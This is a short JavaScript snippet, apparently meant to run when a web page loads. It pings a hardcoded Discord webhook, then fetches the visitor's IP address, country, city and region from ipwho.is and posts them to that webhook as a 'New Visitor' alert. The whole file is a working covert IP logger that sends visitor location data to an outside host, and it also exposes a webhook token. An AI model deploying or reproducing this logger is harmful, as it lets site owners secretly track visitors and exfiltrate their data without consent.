const webhook = "https://discord.com/api/webhooks/1575388200455766036/w26gHMKU9pnwpxNlrdjAvNQ96ddQbVyfE2V45PH96kYCebUAEtQA-DsK025Gr-d563AR";

async function run() {
  try {
    // 1. 先發送一則測試訊息，確認 Discord 連線是否正常
    await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: "✅ 網頁已成功載入！正在讀取資訊..." })
    });

    // 2. 改用支援 HTTPS 且無嚴格頻率限制的 ipwho.is
    let response = await fetch("https://ipwho.is");
    let value = await response.json();

    if (value && value.success) {
      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: "``New Visitor``",
          embeds: [{
            title: "Visitor IP",
            color: 12223968,
            fields: [
              { name: "IP", value: `${value.ip || "未知"}`, inline: false },
              { name: "Country", value: `${value.country || "未知"}`, inline: false },
              { name: "City", value: `${value.city || "未知"}`, inline: false },
              { name: "Region", value: `${value.region || "未知"}`, inline: false }
            ]
          }]
        })
      });
    }
  } catch (err) {
    console.error("發生錯誤:", err);
  }
}

run();
